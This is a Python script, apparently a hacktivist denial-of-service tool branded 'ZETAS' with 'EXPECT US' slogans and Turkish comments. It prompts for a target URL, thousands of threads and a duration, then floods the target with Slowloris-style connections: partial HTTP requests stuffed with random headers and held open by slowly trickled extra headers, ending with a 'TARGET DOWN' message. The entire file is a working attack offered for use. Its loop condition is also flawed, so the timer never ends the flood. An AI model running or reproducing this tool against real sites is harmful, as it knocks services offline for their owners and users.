import socket, ssl, threading, random, time, os
from urllib.parse import urlparse

os.system("clear")
print("\033[92m")
print("""
███████╗███████╗████████╗ █████╗ ███████╗
╚══███╔╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝
  ███╔╝ █████╗     ██║   ███████║███████╗
 ███╔╝  ██╔══╝     ██║   ██╔══██║╚════██║
███████╗███████╗   ██║   ██║  ██║███████║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
            WE ARE ZETAS
      WE DO NOT FORGIVE - WE DO NOT FORGET
                EXPECT US - 2025
""")
print("\033[0m")

target = input("\033[92mTARGET > \033[0m").strip()
if not target.startswith("http"):
    target = "https://" + target

threads = int(input("\033[92mTHREADS (10000-50000) > \033[0m") or 30000)
timer = int(input("\033[92mTIME (sec) > \033[0m") or 900)

parsed = urlparse(target)
host = parsed.hostname
port = parsed.port or (443 if parsed.scheme == "https" else 80)
path = parsed.path if parsed.path else "/"

print(f"\n\033[92m[!] ZETAS ATTACK STARTED → {host}:{port}")
print(f"[!] {threads} ZETAS SOLDIERS ACTIVE → {timer} SECONDS\033[0m")
time.sleep(3)

def zetas_flood():
    while time.time() < time.time() + timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            
            if port == 443:
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=host)

            # RefRef + Slowloris + Header Spam
            s.send(f"GET {path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send(f"User-Agent: ZETAS-2025\r\n".encode())
            for i in range(50):  # Daha fazla X- header
                s.send(f"X-{i}: {random.randint(1,999999)}\r\n".encode())
            s.send("Connection: keep-alive\r\n\r\n".encode())

            # Bağlantıyı açık tut, yavaş yavaş doldur
            while time.time() < time.time() + timer:
                s.send(f"X-a: {random.randint(1,999999)}\r\n".encode())
                time.sleep(0.05)  # Daha agresif

        except Exception:
            pass
        finally:
            try:
                s.close()
            except:
                pass

# Askerleri sal
for i in range(threads):
    t = threading.Thread(target=zetas_flood, daemon=True)
    t.start()

# Süre bitene kadar bekle
time.sleep(timer)

print("\n\033[92m[!] ZETAS ATTACK FINISHED - TARGET DOWN\033[0m")
print("      WE ARE ZETAS - EXPECT US AGAIN 2025\033[0m")
